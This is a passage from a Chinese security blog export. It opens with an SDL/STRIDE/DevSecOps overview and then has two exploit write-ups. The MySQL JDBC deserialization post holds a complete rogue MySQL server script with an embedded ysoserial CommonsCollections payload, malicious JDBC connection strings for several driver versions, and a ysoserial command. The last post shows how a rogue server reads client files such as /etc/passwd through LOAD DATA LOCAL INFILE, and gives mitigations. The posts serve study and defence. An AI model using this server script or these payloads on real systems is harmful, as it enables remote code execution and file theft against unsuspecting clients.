可选的安全活动可选的安全活动是需要专业的安全团队来完成的 代码审计尽管前面有静态代码分析的实践，但是都是基于使用静态代码扫描工具扫描的形式来进行的，其中可能会存在更多的安全代码问题比如业务逻辑漏洞、0day等是工具扫描不出来的，此时就需要专业的安全团队进行人工代码审计，从而进一步提高产品的安全性。 渗透测试渗透测试通过和代码审计一起完成的，侧重在模拟外部黑客来从外部进行黑/灰盒渗透测试，以黑客的视角来发现产品安全问题。 相似产品的漏洞分析专业安全团队通过分析友商或其他相似产品历史出现过的漏洞，再审计当前产品是否存在相似的漏洞，借助其他产品的经验来修补已知的安全问题。 Threat Modeling（威胁建模）威胁建模是SDL流程中的核心组成部分，是一种可以用来帮助开发人员与SDL工程师提前识别可能影响到应用的威胁、攻击、漏洞和对策。使用威胁建模来完成产品的设计，可以有效满足企业的安全目标并降低安全风险。 微软中提到威胁建模的5个关键步骤如下： 定义安全需求 创建应用图解 识别威胁 缓解威胁 验证威胁是否已缓解 在进行威胁建模分析上，微软还提供了专用于威胁建模的工具Microsoft Threat Modeling Tool，工具下载地址：https://aka.ms/threatmodelingtool 威胁建模也是有方法的，就是STRIDE方法。 STRIDESTRIDE威胁建模是由微软提出的一种威胁建模方法，该方法将威胁类型分为Spoofing（仿冒）、Tampering（篡改）、Repudiation（抵赖）、Information Disclosure（信息泄漏）、Denial of Service（拒绝服务）和 Elevation of Privilege（权限提升）。STRIDE威胁模型几乎可以涵盖目前绝大部分安全问题。 相关概念解释如下表： 威胁 定义 对应的安全属性 Spoofing 冒充他人身份 认证 Tampering 修改数据或代码 完整性 Repudiation 否认做过的事 不可抵赖性 Information Disclosure 机密信息泄露 机密性 Denial of Service 拒绝服务 可用性 Elevation of Privilege 未经授权获得许可 授权 STRIDE威胁建模流程和前面介绍的一样： 绘制数据流图 识别威胁 提出缓解措施 安全验证 数据流图数据流图（Data Flow Diagrams）包含外部实体（External Entity）、处理过程（Process）、数据流（Data Flow）、数据存储（Data Store）： 安全人员与系统架构师及设计人员沟通，了解设计详情并画出数据流图后还需要标注信任边界（Trust Boundary），当然也可以通过赋能架构师与开发人员来自行画出数据流图让安全人员评审。 网上一个简单的Web应用数据流图如下，注意要用红色虚拟隔离出信任边界： 为了规范，是需要用到上面提到的Microsoft Threat Modeling Tool这个工具来描绘数据流图的，具体绘图细节这里不多说，看个网上的工具范例： 识别威胁STRIDE威胁建模方法已经明确了每个数据流图元素具有不同的威胁，其中外部实体只有仿冒（S）、抵赖（R）威胁，数据流只有篡改（T）、信息泄露（I）、拒绝服务（D）威胁，处理过程有所有六种（STRIDE）威胁，存储过程有篡改（T）、信息泄露（I）、拒绝服务（D）威胁，但如果是日志类型存储则还有抵赖（R）威胁。具体可以对照如下表格进行威胁识别： 元素 S T R I D E 外部实体 √ √ 处理过程 √ √ √ √ √ √ 数据存储 √ ？ √ √ 数据流 √ √ √ 缓解措施识别到威胁之后，就要针对某一项危险提出对应的缓解措施。注意，这里之所以是缓解而不是消除，是因为大多数时候由于业务功能导致很多威胁是无法根除的。 微软对于常用的威胁给出了其常用的标准缓解措施，并在具体实施时已将常用的缓解方案及措施集成为独立的解决方案或者代码模块。可以方便同类应用直接使用。 威胁类型 缓解措施 技术方案 仿冒(S) 认证 Kerberos认证PKI系统如SSL / TLS证书数字签名 篡改(T) 完整性保护 访问控制完整性校验 抵赖(R) 日志审计 强认证安全日志、审计 信息泄露(I) 保密性 加密访问控制列表 拒绝服务(D) 可用性 访问控制列表过滤热备份 权限提升(E) 授权认证 输入校验用户组管理访问控制列表 安全验证在威胁建模完成后，需要对整个过程进行回顾，不仅要确认缓解措施是否能够真正缓解潜在威胁，同时验证数据流图是否符合设计，代码实现是否符合预期设计，所有的威胁是否都有相应的缓解措施。最后将威胁建模报告留存档案，作为后续迭代开发、增量开发时威胁建模的参考依据。 0x03 DevSecOps软件开发模型的演进在说到DevSecOps之前就必须先了解下软件开发模型的主要演进过程。 瀑布模型在传统的软件开发模型中，最常用的就是瀑布模型（Waterfall Model）。 瀑布模型是严格把软件项目的开发分隔成各个开发阶段，使用里程碑的方式，严格定义了各开发阶段的输入和输出。如果达不到要求的输出，下一阶段的工作就不展开。 敏捷开发传统的瀑布模型是没法满足日新月异的业务需求变化的，此时就出现了敏捷开发模型。 敏捷软件开发（Agile software development），又称敏捷开发，是一种从1990年代开始逐渐引起广泛关注的一些新型软件开发方法，是一种应对快速变化的需求的一种软件开发能力。它们的具体名称、理念、过程、术语都不尽相同，相对于“非敏捷”，更强调程序员团队与业务专家之间的紧密协作、面对面的沟通（认为比书面的文档更有效）、频繁交付新的软件版本、紧凑而自我组织型的团队、能够很好地适应需求变化的代码编写和团队组织方法，也更注重软件开发过程中人的作用。 敏捷开发的核心是迭代。 如图，可以明显看到两者的区别： 可以看到，敏捷开发是将分析、设计、编码和测试等阶段作为迭代的部分来进行迭代开发的。但是，这只是开发流程的快速优化，运维流程并不在其中，也就是说在瀑布或敏捷模型中都是要开发流程走完才能到达运维人员负责后续的运维阶段（Operations）的工作，这就导致业务不能提供更快速稳定的交付了。此时，DevOps应运而生。 DevOpsDevOps简介DevOps并无权威官方的描述定义，这里引用维基百科的： DevOps（Development和Operations的组合词）是一种重视“软件开发人员（Dev）”和“IT运维技术人员（Ops）”之间沟通合作的文化、运动或惯例。透过自动化“软件交付”和“架构变更”的流程，来使得构建、测试、发布软件能够更加地快捷、频繁和可靠。 可以把DevOps看作开发（软件工程）、技术运营和质量保障（QA）三者的交集： DevOps强调的是高效组织团队之间如何通过自动化的工具协作和沟通来完成软件的生命周期管理，从而更快、更频繁地交付更稳定的软件。 DevOps生命周期DevOps的生命周期如图，是个循环的、开发与运维各阶段活动集成的： 概念对比这里引用腾讯安全云鼎实验室的图，一目了然这几种软件开发模型之间的区别： 如上图所示，部署操作并不是等到最后才进行、而是和开发测试操作一同迭代进行的。 DevOps做法DevOps做法如下： 持续集成和持续交付（CI/CD） 版本控制 敏捷软件开发 基础结构即代码 配置管理 持续监视 给SDL带来的挑战SDL是将安全考虑集成在软件开发的每一个阶段、为每一个开发阶段添加对应的安全活动，是基于产品发布上线前进行的一系列安全活动，这种模式在瀑布模型和敏捷开发中是适用的。但是到了DevOps后，SDL就显得相形见绌了，主要在于DevOps的快速持续集成、持续交付、持续部署等特性和SDL执行的流水线式缓慢过程是互相冲突的，这就使得安全拖慢了DevOps。 基于此，Gartner在2012年就提出了DevSecOps来解决安全DevOps问题。 DevSecOps简介DevSecOps，全称Development Security Operations，是一套有Gartner提出的基于DevOps体系的全新IT安全实践战略框架，是一种旨在将安全性嵌入DevOps链条中的每个部分新方法，它有助于在开发过程早期而不是产品发布后识别安全问题，目标是让每个人对信息安全负责，而不仅仅是安全部门。 相比于SDL，DevSecOps已不只是关注开发阶段的安全，而是需要将安全嵌入到开发和运维的整个DevOps的生命周期中。 在之前，安全只是特定团队的职责，是在开发的最后阶段才会介入的： 这种方式显然会拖累DecOps的高效性，因此DevSecOps提出的概念就是，安全是整个IT团队的共同职责，人人为安全负责，人人参与安全： 广义上的DevOps的建设会包含：人、流程、工具等多方面内容。 因此，DevSecOps 意味着从一开始就要考虑应用和基础架构的安全性；同时还要让某些安全网关实现自动化，以防止 DevOps 工作流程变慢。选择合适的工具来持续集成安全防护（比如在集成开发环境（IDE）中集成安全防护功能）有助于实现这些目标。但是高效的 DevOps 安防需要的不仅是新工具。它更需要整个公司实现 DevOps 文化变革，从而尽早集成安全团队的工作。 DevSecOps架构图DevSecOps架构图如下： 从SDL到DevSecOps的变化个人理解，DevSecOps就是SDL针对DecOps的快速优化版，两者并非是完全不同的东西，而是针对迭代快速的业务进行的优化： 安全文化普及，强调每个人都对安全负责； 更多的自动化实现，摒弃SDL中过多的人工参与； 融入整个开发与运维流程中，而不是只嵌入开发流程； 使得安全活动更为前置； DevSecOps实践这块尚未接触，写了也是纸上谈兵，后续如果接触到DevSecOps实践这块再补充。 0x04 参考从SDL到DevSecOps：始终贯穿开发生命周期的安全 Microsoft Security Development Lifecycle 【软件安全设计】安全开发生命周期（SDL） 什么是 DevOps？ 什么是 DevSecOps?","tags":[{"name":"DevSecOps","slug":"DevSecOps","permalink":"https://www.mi1k7ea.com/tags/DevSecOps/"},{"name":"SDL","slug":"SDL","permalink":"https://www.mi1k7ea.com/tags/SDL/"}]},{"title":"MySQL JDBC反序列化漏洞","date":"2021-04-23T04:33:08.000Z","path":"2021/04/23/MySQL-JDBC反序列化漏洞/","text":"0x00 前言HW期间遇到这个洞，研究研究。 参考： 小白看得懂的MySQL JDBC 反序列化漏洞分析 MySQL JDBC 客户端反序列化漏洞分析 MySQL JDBC 客户端反序列化漏洞 0x01 MySQL JDBC反序列化漏洞JDBC简介JDBC（Java DataBase Connectivity）即Java数据库连接，是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法。 一般格式： 1jdbc://driver://host:port/database?配置name1=配置Value1&amp;配置name2=配置Value2 漏洞原理如果攻击者能够控制JDBC连接设置项，那么就可以通过设置其指向恶意MySQL服务器进行ObjectInputStream.readObject()的反序列化攻击从而RCE。 具体点说，就是通过JDBC连接MySQL服务端时，会有几个内置的SQL查询语句要执行，其中两个查询的结果集在MySQL客户端被处理时会调用ObjectInputStream.readObject()进行反序列化操作。如果攻击者搭建恶意MySQL服务器来控制这两个查询的结果集，并且攻击者可以控制JDBC连接设置项，那么就能触发MySQL JDBC客户端反序列化漏洞。 可被利用的两条查询语句： SHOW SESSION STATUS SHOW COLLATION 漏洞复现恶意MySQL服务器搭建可参考： https://github.com/fnmsd/MySQL_Fake_Server https://github.com/rmb122/rogue_mysql_server 这里采用的是另一个脚本，使用Python3运行即可，只用Python自带的库： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100# coding=utf-8import socketimport binasciiimport osgreeting_data=\"4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400\"response_ok_data=\"0700000200000002000000\"def receive_data(conn): data = conn.recv(1024) print(\"[*] Receiveing the package : &#123;&#125;\".format(data)) return str(data).lower()def send_data(conn,data): print(\"[*] Sending the package : &#123;&#125;\".format(data)) conn.send(binascii.a2b_hex(data))def get_payload_content(): #file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload file= r'payload' if os.path.isfile(file): with open(file, 'rb') as f: payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8') print(\"open successs\") else: print(\"open false\") #calc payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878' return payload_content# 主要逻辑def run(): while 1: conn, addr = sk.accept() print(\"Connection come from &#123;&#125;:&#123;&#125;\".format(addr[0],addr[1])) # 1.先发送第一个 问候报文 send_data(conn,greeting_data) while True: # 登录认证过程模拟 1.客户端发送request login报文 2.服务端响应response_ok receive_data(conn) send_data(conn,response_ok_data) #其他过程 data=receive_data(conn) #查询一些配置信息,其中会发送自己的 版本号 if \"session.auto_increment_increment\" in data: _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000' send_data(conn,_payload) data=receive_data(conn) elif \"show warnings\" in data: _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000' send_data(conn, _payload) data = receive_data(conn) if \"set names\" in data: send_data(conn, response_ok_data) data = receive_data(conn) if \"set character_set_results\" in data: send_data(conn, response_ok_data) data = receive_data(conn) if \"show session status\" in data: mysql_data = '0100000102' mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000' mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000' # 为什么我加了EOF Packet 就无法正常运行呢？？ # 获取payload payload_content=get_payload_content() # 计算payload长度 payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4) payload_length_hex = payload_length[2:4] + payload_length[0:2] # 计算数据包长度 data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6) data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2] mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex mysql_data += str(payload_content) mysql_data += '07000005fe000022000100' send_data(conn, mysql_data) data = receive_data(conn) if \"show warnings\" in data: payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000' send_data(conn, payload) breakif __name__ == '__main__': HOST ='0.0.0.0' PORT = 3306 sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间 sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sk.bind((HOST, PORT)) sk.listen(1) print(\"start fake mysql server listening on &#123;&#125;:&#123;&#125;\".format(HOST,PORT)) run() Demo代码，假设JDBC连接地址可控，并在环境中添加mysql-connector-java-8.0.13和commons-collections-3.2.1依赖： 123456789101112import java.sql.*;public class Test &#123; public static void main(String[] args) throws Exception &#123; Class.forName(\"com.mysql.jdbc.Driver\"); String jdbc_url = \"jdbc:mysql://x.x.x.x:3306/test?\" + \"autoDeserialize=true\" + \"&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\"; Connection con = DriverManager.getConnection(jdbc_url, \"root\", \"root\"); &#125;&#125; 此时JDBC连接设置为： 1jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor 参数说明： queryInterceptors：一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的类），在Query”之间”进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）； autoDeserialize：自动检测与反序列化存在BLOB字段中的对象； 先使用ysoserial生成CC7的payload，然后运行恶意MySQL服务器进行监听： 12java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 calc &gt; payloadpython3 evil_mysql.py 运行成功触发： 看到恶意MySQL服务是有具体的接受发送报文信息的： 各种payload小结ServerStatusDiffInterceptor触发点8.x如上述Demo： 1jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor 6.x属性名不同，queryInterceptors换为statementInterceptors： 1jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor &gt;=5.1.11包名中没有cj： 1jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor 5.x &lt;= 5.1.10同上，但需要连接后执行查询。 detectCustomCollations触发点5.1.29 - 5.1.401jdbc:mysql://x.x.x.x:3306/test?detectCustomCollations=true&amp;autoDeserialize=true 5.1.28 - 5.1.191jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true 漏洞分析这里仅分析ServerStatusDiffInterceptor触发点的漏洞场景。 在前面的代码调试分析发现，在调用com.mysql.cj.jdbc中相关函数来连接恶意MySQL服务器时，会调用到com.mysql.cj.jdbc.result.ResultSetImpl.getObject()函数，而其中会调用readObject()函数执行反序列化操作，说明看注释： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263@Overridepublic Object getObject(int columnIndex) throws SQLException &#123; checkRowPos(); checkColumnBounds(columnIndex); int columnIndexMinusOne = columnIndex - 1; // we can't completely rely on code below because primitives have default values for null (e.g. int-&gt;0) if (this.thisRow.getNull(columnIndexMinusOne)) &#123; return null; &#125; Field field = this.columnDefinition.getFields()[columnIndexMinusOne]; switch (field.getMysqlType()) &#123; ... case BINARY: case VARBINARY: case TINYBLOB: case MEDIUMBLOB: case LONGBLOB: case BLOB: // 判断是否为Binary或Blob格式数据 if (field.isBinary() || field.isBlob()) &#123; byte[] data = getBytes(columnIndex); // 判断autoDeserialize属性值是否为true，是的话才能进入反序列化操作的代码逻辑 // 这就是为啥设置JDBC连接时需要带上autoDeserialize=true的原因 if (this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) &#123; Object obj = data; // -84和-19为序列化对象的前两个字节，即AC和ED if ((data != null) &amp;&amp; (data.length &gt;= 2)) &#123; if ((data[0] == -84) &amp;&amp; (data[1] == -19)) &#123; // Serialized object? try &#123; ByteArrayInputStream bytesIn = new ByteArrayInputStream(data); ObjectInputStream objIn = new ObjectInputStream(bytesIn); obj = objIn.readObject(); objIn.close(); bytesIn.close(); &#125; catch (ClassNotFoundException cnfe) &#123; throw SQLError.createSQLException(Messages.getString(\"ResultSet.Class_not_found___91\") + cnfe.toString() + Messages.getString(\"ResultSet._while_reading_serialized_object_92\"), getExceptionInterceptor()); &#125; catch (IOException ex) &#123; obj = data; // not serialized? &#125; &#125; else &#123; return getString(columnIndex); &#125; &#125; return obj; &#125; return data; &#125; return getBytes(columnIndex); ... &#125;&#125; 下面调试看下怎么调用到com.mysql.cj.jdbc.result.ResultSetImpl.getObject()函数的，只看关键点。 一开始是com.mysql.jdbc.Driver进行JDBC中的连接，其中会新建连接实例： 连接后，接着设置对应的查询拦截器，对应的值就是我们在JDBC中设置的ServerStatusDiffInterceptor： 往下，程序从MySQL服务端来初始化Properties并执行相关的SQL语句，其中判断如果查询拦截器不为空则调用查询拦截器的preProcess()函数： 跟进看到，会运行查询语句SHOW SESSION STATUS，然后调用ResultSetUtil.resultSetToMap()函数，该函数中就调用了触发反序列化漏洞的getObject()函数（注意columnIndex为2处才能走到反序列化的代码逻辑，因为为1则直接返回null）： 在调用getObject()函数中，判断MySQL的类型为BLOB后，就从MySQL服务端中获取对应的字节码数据： 从MySQL服务端获取到字节码数据后，判断autoDeserialize是否为true、字节码数据是否为序列化对象等，最后调用readObject()触发反序列化漏洞： 也就是说，当MySQL字段类型为BLOB时，会对数据进行反序列化操作，因此只要保证第1或第2字段为BLOB类型且存储了恶意序列化数据即可触发反序列化漏洞。 此时函数调用栈如下： 1234567891011121314151617181920getObject:1326, ResultSetImpl (com.mysql.cj.jdbc.result)resultSetToMap:46, ResultSetUtil (com.mysql.cj.jdbc.util)populateMapWithSessionStatusValues:87, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)preProcess:105, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)preProcess:76, NoSubInterceptorWrapper (com.mysql.cj)invokeQueryInterceptorsPre:1137, NativeProtocol (com.mysql.cj.protocol.a)sendQueryPacket:963, NativeProtocol (com.mysql.cj.protocol.a)sendQueryString:914, NativeProtocol (com.mysql.cj.protocol.a)execSQL:1150, NativeSession (com.mysql.cj)setAutoCommit:2064, ConnectionImpl (com.mysql.cj.jdbc)handleAutoCommitDefaults:1382, ConnectionImpl (com.mysql.cj.jdbc)initializePropsFromServer:1327, ConnectionImpl (com.mysql.cj.jdbc)connectOneTryOnly:966, ConnectionImpl (com.mysql.cj.jdbc)createNewIO:825, ConnectionImpl (com.mysql.cj.jdbc)&lt;init&gt;:455, ConnectionImpl (com.mysql.cj.jdbc)getInstance:240, ConnectionImpl (com.mysql.cj.jdbc)connect:207, NonRegisteringDriver (com.mysql.cj.jdbc)getConnection:664, DriverManager (java.sql)getConnection:247, DriverManager (java.sql)main:10, Test 小结MySQL JDBC客户端在开始连接MySQL服务端时，会执行一些如set autocommit=1等SQL Query，其中会触发我们所配置的queryInterceptors中的preProcess()函数，在该函数逻辑中、当MySQL字段类型为BLOB时，会对数据进行反序列化操作，因此只要保证第1或第2字段为BLOB类型且存储了恶意序列化数据即可触发反序列化漏洞。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"MySQL","slug":"MySQL","permalink":"https://www.mi1k7ea.com/tags/MySQL/"}]},{"title":"MySQL客户端任意文件读取","date":"2021-04-23T04:32:46.000Z","path":"2021/04/23/MySQL客户端任意文件读取/","text":"0x00 前言之前学习Jackson一条Gadget的时候涉及过，HW期间又发现类似的恶意利用工具和漏洞，就再补充一些细节。 0x01 MySQL客户端任意文件读取LOAD DATA LOCAL INFILE具体可参考：https://dev.mysql.com/doc/mysql-security-excerpt/5.7/en/load-data-local-security.html MySQL支持使用LOAD DATA LOCAL INFILE语句，即可将客户端本地的文件中的数据insert到MySQL的某张表中。 注意，还有个LOAD DATA INFILE语句，这是加载服务端的文件而非客户端的。 LOAD DATA LOCAL INFILE的工作过程大致如下： 用户在客户端输入：load data local file “/data.txt” into table test； 客户端-&gt;服务端：我想把我本地的/data.txt文件插入到test表中； 服务端-&gt;客户端：把你本地的/data.txt文件发给我； 客户端-&gt;服务端：/data.txt文件的内容； 测试看下LOAD DATA LOCAL INFILE语句，用Kali作为客户端远程连接MySQL服务，然后执行如下SQL语句来将/etc/passwd文件中的内容插入到MySQL的users表中： 1load data local infile \"/etc/passwd\" into table users FIELDS TERMINATED BY '\\n'; 漏洞原理上述过程存在一个问题，即客户端发送哪个文件的内容，取决于第三步即服务端响应的想要的哪个文件，如果服务端是个恶意的MySQL，那么它可以读取客户端的任意文件内容，比如读取/etc/passwd： 用户在客户端输入：load data local file “/data.txt” into table test； 客户端-&gt;服务端：我想把我本地的/data.txt文件插入到test表中； 服务端-&gt;客户端：把你本地的/etc/passwd文件发给我； 客户端-&gt;服务端：/etc/passwd文件的内容； 而且，在大部分客户端（比如MySQL Connect/J）的实现里，第一步和第二部并非是必须的，客户端发送任意查询给服务端，服务端都可以返回文件发送的请求。而大部分客户端在建立连接之后，都会有一些查询服务器配置之类的查询，所以使用这些客户端，只要创建了到恶意MySQL服务器的连接，那么客户端所在的服务器上的所有文件都可能泄露。 注意：如果使用MySQL客户端直接连接的话，是需要添加--enable-local-infile选项的，而其他大部分MySQL客户端实现中，是默认开启的，比如allowLoadLocalInfile是MySQL的JDBC驱动的一个创建连接的配置项、用来控制是否允许从本地读取文件，默认值为True，具体的MySQL客户端实现得具体看。 漏洞复现攻击流程如下： 攻击者开启伪造的恶意MySQL服务器，诱使受害者MySQL客户端访问； 受害者向恶意MySQL服务器发起请求，并尝试进行身份认证； 恶意MySQL服务器接受到受害者的连接请求后，发送正常的问候、身份验证正确并且发送LOAD DATA LOCAL INFILE语句来读取受害者客户端本地敏感文件； 受害者的MySQL客户端认为身份验证正确，执行攻击者的发来的请求，通过LOAD DATA LOCAL INFILE语句将本地文件内容发给恶意MySQL服务器； 恶意MySQL服务器接受到客户端敏感文件，Done； GitHub上恶意MySQL服务相关项目： https://github.com/rmb122/rogue_mysql_server https://github.com/Gifts/Rogue-MySql-Server 开启恶意MySQL服务后，受害者尝试使用MySQL客户端连接恶意服务端（这里metasploitable机子的MySQL版本为5.0.51a-3ubuntu5，无需添加--enable-local-infile选项即可成功）： 恶意MySQL服务端窃取到了/etc/passwd文件内容： 解决方案针对LOAD DATA LOCAL INFILE的安全问题，MySQL官方给出如下说明： 为了避免连接到不受信任的服务器，客户端可以建立安全连接并通过使用--ssl-mode=VERIFY_IDENTITY选项和适当的CA证书进行连接来验证服务器身份 。 为避免出现LOAD DATA问题，客户应避免使用LOCAL。 管理员和应用程序可以配置是否允许本地数据加载，如下所示： 在服务器端： 所述local_infile系统变量控制服务器端LOCAL 的能力。根据 local_infile设置，服务器会拒绝或允许请求本地数据加载的客户端加载本地数据。 默认情况下，它local_infile 是禁用的。要显式地使服务器拒绝或允许LOAD DATA LOCAL语句（无论在构建时或运行时如何配置客户端程序和库），请在 禁用或启用的情况下启动mysqldlocal_infile。local_infile也可以在运行时设置。 在客户端： 该CMake的选项控制编译默认的MySQL客户端库能力（见 MySQL源代码的配置选项）。因此，未进行明确安排的客户端将 根据MySQL构建时指定的设置禁用或启用功能 。 ENABLED_LOCAL_INFILE LOCAL`LOCAL[ENABLED_LOCAL_INFILE`](https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html#option_cmake_enabled_local_infile) 默认情况下，MySQL二进制发行版中的客户端库在ENABLED_LOCAL_INFILE 启用时进行编译 。如果从源代码编译MySQL，请ENABLED_LOCAL_INFILE 根据未进行显式安排的客户端应LOCAL 禁用还是启用功能，将其配置为禁用或启用。 对于使用C API的客户端程序，本地数据加载功能由编译到MySQL客户端库中的默认值决定。要显式启用或禁用它，请调用mysql_options() C API函数以禁用或启用该 MYSQL_OPT_LOCAL_INFILE选项。参见 mysql_options（）。 对于mysql客户端，本地数据加载能力由编译到MySQL客户端库中的默认值决定。要显式禁用或启用它，请使用 --local-infile=0或 --local-infile[=1\\]选项。 